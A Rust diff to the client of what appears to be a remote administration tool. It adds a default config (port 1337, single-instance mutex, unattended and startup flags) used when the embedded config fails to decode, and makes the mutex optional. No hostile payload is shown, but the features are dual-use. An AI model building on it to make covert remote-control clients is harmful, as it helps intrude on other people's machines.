@@ -24,10 +24,10 @@ use crate::features::tray_icon::TrayIcon;
 use common::commands::{Command, EncryptionResponseData};
 use common::buffers::write_buffer;
 
-use rand::{ SeedableRng};
+use rand::SeedableRng;
 use rand_chacha::ChaCha20Rng;
 
-use rsa::{RsaPublicKey, RsaPrivateKey, traits::PaddingScheme};
+use rsa::RsaPublicKey;
 
 fn handle_server(
     mut read_stream: TcpStream,
@@ -180,17 +180,28 @@ fn handle_server(
 }
 
 fn main() {
-    let config: ClientConfig = rmp_serde::from_read(std::io::Cursor::new(&CONFIG)).unwrap();
+    let mut config: ClientConfig = ClientConfig {
+        ip: "".to_string(),
+        port: "1337".to_string(),
+        mutex_enabled: true,
+        mutex: "TEST123".to_string(),
+        unattended_mode: false,
+        startup: false,
+    };
 
-    println!("Client configuration: {:?}", config);
+    let config_link_sec: Result<ClientConfig, rmp_serde::decode::Error> = rmp_serde::from_read(std::io::Cursor::new(&CONFIG));
 
+    if let Some(config_link_sec) = config_link_sec.as_ref().ok() {
+        config = config_link_sec.clone();
+    }
 
-    service::mutex::mutex_lock(&config.mutex);
-
+    if config.mutex_enabled {
+        service::mutex::mutex_lock(&config.mutex);
+    }
 
     let is_connected = Arc::new(Mutex::new(false));
 
-    let mut tray_icon = Arc::new(Mutex::new(TrayIcon::new()));
+    let tray_icon = Arc::new(Mutex::new(TrayIcon::new()));
 
     if !config.unattended_mode
     {
